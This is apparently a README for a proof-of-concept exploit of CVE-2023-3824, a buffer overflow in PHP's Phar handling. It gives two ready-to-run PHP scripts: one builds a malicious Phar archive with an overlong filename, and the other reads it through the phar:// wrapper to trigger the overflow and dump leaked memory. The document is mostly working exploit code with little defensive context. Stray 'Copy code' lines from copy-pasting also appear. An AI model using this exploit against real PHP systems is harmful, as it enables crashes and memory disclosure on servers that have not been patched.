# PHP Malicious Phar File PoC (CVE-2023-3824)

## Description

This Proof of Concept (PoC) demonstrates how to create a malicious Phar file in PHP and trigger a buffer overflow vulnerability.

## Usage

### Creating the Malicious Phar File

1. Create a new PHP file (e.g., `create_phar.php`) and add the following code:

```php
<?php
$phar = new Phar('malicious.phar');
$phar->startBuffering();
$phar->addFromString(str_repeat('A', PHP_MAXPATHLEN - 1).'B', 'This is the content of the file.');
$phar->stopBuffering();
?>
```
Execute the PHP script to create the malicious Phar file:
Copy code
```php
php create_phar.php
```
Triggering the Buffer Overflow
Create another PHP file (e.g., trigger_overflow.php) and add the following code:
```php
<?php
$handle = opendir("phar://./malicious.phar");
$x = readdir($handle);
closedir($handle);

var_dump($x);
?>
```
Execute the PHP script to trigger the buffer overflow:
Copy code
php trigger_overflow.php
The var_dump($x) statement will output the result of the buffer overflow and overread operation.
